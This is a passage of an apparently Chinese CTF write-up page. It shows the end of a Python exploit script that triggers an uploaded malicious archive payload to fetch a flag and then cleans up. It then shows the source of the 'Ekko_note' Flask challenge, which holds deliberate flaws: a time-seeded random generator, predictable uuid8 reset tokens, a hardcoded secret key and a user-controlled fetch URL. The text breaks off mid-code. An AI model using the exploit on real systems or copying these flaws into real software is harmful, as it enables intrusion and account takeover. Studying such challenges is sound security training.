punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span> <span class="token comment"># 发送GET请求访问触发文件，此时服务器会解析触发文件，执行其中包含的恶意载荷</span> flag_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span> <span class="token comment"># 检查响应是否成功，且内容中不包含"Error"（排除错误情况）</span> <span class="token keyword">if</span> flag_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">"Error"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag_response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"="</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"🎉 成功获取到Flag！ 🎉"</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag内容：</span><span class="token interpolation"><span class="token punctuation">{</span>flag_response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token comment"># 输出获取到的flag</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 获取flag失败。服务器状态码：</span><span class="token interpolation"><span class="token punctuation">{</span>flag_response<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"    服务器响应：</span><span class="token interpolation"><span class="token punctuation">{</span>flag_response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment"># 捕获访问触发文件时的网络异常</span><span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 获取flag时发生网络错误：</span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span> sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span> <span class="token comment"># 4. 清理操作：删除本地创建的临时文件（避免残留）</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 清理本地临时文件..."</span><span class="token punctuation">)</span> <span class="token comment"># 遍历所有临时文件（载荷文本、载荷ZIP、触发文本、触发ZIP）</span> <span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token punctuation">[</span>payload_filename<span class="token punctuation">,</span> payload_zip_path<span class="token punctuation">,</span> trigger_filename<span class="token punctuation">,</span> trigger_zip_path<span class="token punctuation">]</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 若文件存在，则删除</span>         os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 清理完成。"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><hr><h3 id="Ekko-note"><a href="#Ekko-note" class="headerlink" title="Ekko_note"></a>Ekko_note</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- encoding: utf-8 -*-</span><span class="token triple-quoted-string string">'''@File    :   app.py@Time    :   2066/07/05 19:20:29@Author  :   Ekko exec inc. 某牛马程序员 '''</span><span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">import</span> uuid<span class="token keyword">import</span> requests<span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">from</span> secrets <span class="token keyword">import</span> token_urlsafe<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> sessionSERVER_START_TIME <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。</span><span class="token comment"># 反正整个程序没有一个地方用到random库。应该没有什么问题。</span><span class="token keyword">import</span> randomrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>SERVER_START_TIME<span class="token punctuation">)</span>admin_super_strong_password <span class="token operator">=</span> token_urlsafe<span class="token punctuation">(</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'your-secret-key-here'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_DATABASE_URI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'sqlite:///site.db'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    is_admin <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    time_api <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'https://api.uuni.cn//api/time'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">PasswordResetToken</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    user_id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'user.id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    token <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    used <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Boolean<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">padding</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    byte_string <span class="token operator">=</span> input_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_string<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">6</span><span class="token punctuation">:</span> byte_string <span class="token operator">=</span> byte_string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    padded_byte_string <span class="token operator">=</span> byte_string<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    padded_int <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>padded_byte_string<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> padded_int<span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        admin <span class="token operator">=</span> User<span class="token punctuation">(</span>            username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">,</span>            email<span class="token operator">=</span><span class="token string">'admin@example.com'</span><span class="token punctuation">,</span>            password<span class="token operator">=</span>generate_password_hash<span class="token punctuation">(</span>admin_super_strong_password<span class="token punctuation">)</span><span class="token punctuation">,</span>            is_admin<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>admin<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'user_id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'请登录'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> decorated_function<span class="token keyword">def</span> <span class="token function">admin_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'user_id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'请登录'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>is_admin<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'你不是admin'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> decorated_function<span class="token keyword">def</span> <span class="token function">check_time_api</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>user<span class="token punctuation">.</span>time_api<span class="token punctuation">)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        datetime_str <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> datetime_str<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>datetime_str<span class="token punctuation">)</span>            current_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>fromisoformat<span class="token punctuation">(</span>datetime_str<span class="token punctuation">)</span>            <span class="token keyword">return</span> current_time<span class="token punctuation">.</span>year <span class="token operator">&gt;=</span> <span class="token number">2066</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'home.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/server_info'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">server_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">'server_start_time'</span><span class="token punctuation">:</span> SERVER_START_TIME<span class="token punctuation">,</span>        <span class="token string">'current_time'</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        confirm_password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'confirm_password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> password <span class="token operator">!=</span> confirm_password<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'密码错误'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        existing_user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> existing_user<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'已经存在这个用户了'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        existing_email <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>email<span class="token operator">=</span>email<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> existing_email<span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'这个邮箱已经被注册了'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        hashed_password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>        new_user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> email<span class="token operator">=</span>email<span class="token punctuation">,</span> password<span class="token operator">=</span>hashed_password<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'注册成功，请登录'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">and</span> check_password_hash<span class="token punctuation">(</span>user<span class="token punctuation">.</span>password<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token builtin">id</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">.</span>username            session<span class="token punctuation">[</span><span class="token string">'is_admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">.</span>is_admin            flash<span class="token punctuation">(</span><span class="token string">'登陆成功，欢迎!'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'用户名或密码错误!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">'成功登出'</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/dashboard'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@login_required</span><span class="token keyword">def</span> <span class="token function">dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/forgot_password'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">forgot_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>email<span class="token operator">=</span>email<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user<span class="token punctuation">:</span>            <span class="token comment"># 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span>            <span class="token comment"># UUID v8吧，看起来版本比较新</span>            token <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid8<span class="token punctuation">(</span>a<span class="token operator">=</span>padding<span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 可以自定义参数吗原来，那把username放进去吧</span>            reset_token <span class="token operator">=</span> PasswordResetToken<span class="token punctuation">(</span>user_id<span class="token operator">=</span>user<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>reset_token<span class="token punctuation">)</span>            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># TODO：写一个SMTP服务把token发出去</span>            flash<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'密码恢复token已经发送，请检查你的邮箱'</span></span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'reset_password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'没有找到该邮箱对应的注册账户'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'forgot_password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'forgot_password.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset_password'</span><span class="token punctuation">,</span> methods<span 